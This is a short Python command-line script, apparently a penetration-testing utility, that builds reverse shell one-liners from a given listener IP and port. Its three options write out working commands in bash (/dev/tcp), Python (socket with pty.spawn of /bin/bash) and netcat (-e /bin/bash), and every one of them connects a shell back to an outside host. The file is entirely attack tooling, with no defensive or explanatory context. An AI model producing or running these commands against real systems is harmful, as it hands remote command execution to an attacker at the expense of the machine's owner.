#!/usr/bin/env python3

import argparse

def generate_shell(ip, port, shell_type):
    if shell_type == "bash":
        return f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
    elif shell_type == "python":
        return f"python3 -c 'import socket,os,pty; s=socket.socket(); s.connect((\"{ip}\",{port})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); pty.spawn(\"/bin/bash\")'"
    elif shell_type == "nc":
        return f"nc -e /bin/bash {ip} {port}"
    else:
        return "[!] Unknown shell type"

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Reverse Shell Generator")
    parser.add_argument("ip", help="Your IP (Listener IP)")
    parser.add_argument("port", help="Port to connect back to")
    parser.add_argument("-t", "--type", choices=["bash", "python", "nc"], default="bash", help="Type of reverse shell (default: bash)")
    args = parser.parse_args()

    shell = generate_shell(args.ip, args.port, args.type)
    print(f"\n[+] Reverse Shell ({args.type})\n")
    print(shell)
